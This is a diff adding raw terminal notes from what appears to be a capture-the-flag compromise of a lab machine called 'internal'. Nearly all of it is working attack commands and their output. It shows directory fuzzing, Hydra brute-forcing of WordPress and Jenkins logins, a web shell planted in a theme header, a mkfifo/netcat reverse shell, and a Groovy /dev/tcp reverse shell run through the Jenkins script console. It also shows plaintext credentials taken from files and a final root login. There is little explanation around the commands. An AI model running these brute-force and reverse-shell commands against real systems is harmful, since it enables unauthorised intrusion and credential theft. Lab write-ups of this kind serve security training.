@@ -1,0 +1,147 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://10.201.36.23/FUZZ/ --hc 404
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.201.36.23/FUZZ/
+Total requests: 62281
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000139:   403        9 L      28 W       277 Ch      "javascript"                                        
+000000050:   200        329 L    3644 W     53942 Ch    "blog"                                              
+000000300:   200        25 L     359 W      10508 Ch    "phpmyadmin"                                        
+000000386:   403        9 L      28 W       277 Ch      "icons"                                             
+000004227:   403        9 L      28 W       277 Ch      "server-status"  
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=unknown"     
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-01 00:36:48
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://internal.thm:80/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=unknown
+[STATUS] 1998.00 tries/min, 1998 tries in 00:01h, 14342401 to do in 119:39h, 16 active
+[80][http-post-form] host: internal.thm   login: admin   password: my2boys
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-01 00:38:59
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+changed header to my prettywebshell.php
+
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.6.66.96 53 > /tmp/f
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53
+listening on [any] 53 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.36.23] 35440
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ which python3
+/usr/bin/python3
+
+
+
+www-data@internal:/opt$ ls -lsa
+total 16
+4 drwxr-xr-x  3 root root 4096 Aug  3  2020 .
+4 drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
+4 drwx--x--x  4 root root 4096 Aug  3  2020 containerd
+4 -rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
+www-data@internal:/opt$ cat wp-save.txt
+Bill,
+
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+
+aubreanna:bubb13guM!@#123
+www-data@internal:/opt$ 
+ 
+
+
+
+aubreanna@internal:~$ cat jenkins.txt
+Internal Jenkins service is running on 172.17.0.2:8080
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -N -L 8080:172.17.0.2:8080 aubreanna@10.201.36.23
+aubreanna@10.201.36.23's password: 
+
+
+http://http://localhost:8080
+takes us to
+http://localhost:8080/login?from=%2F
+
+
+┌──(root㉿kali)-[~]
+└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 localhost http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-01 01:09:25
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://localhost:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid
+[STATUS] 475.00 tries/min, 475 tries in 00:01h, 14343924 to do in 503:18h, 16 active
+[8080][http-post-form] host: localhost   login: admin   password: spongebob
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-01 01:10:35
+                                                                                                                    
+┌──(root㉿kali)-[~]
+└─# 
+
+
+once logged in
+http://localhost:8080/script
+
+String host="10.6.66.96";
+int port=53;
+String cmd="bash";
+Process p=new ProcessBuilder(cmd,"-c","exec bash -i &>/dev/tcp/"+host+"/"+port+" <&1").start();
+
+
+
+
+┌──(root㉿kali)-[~]
+└─# nc -lvnp 53
+listening on [any] 53 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.36.23] 34162
+bash: cannot set terminal process group (6): Inappropriate ioctl for device
+bash: no job control in this shell
+jenkins@jenkins:/$ 
+
+
+
+jenkins@jenkins:/opt$ cat note.txt
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+jenkins@jenkins:/opt$ 
+
+
+
+┌──(root㉿kali)-[~]
+└─# ssh root@10.201.36.23                                
+root@10.201.36.23's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+...
+Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
+root@internal:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@internal:~# 
+
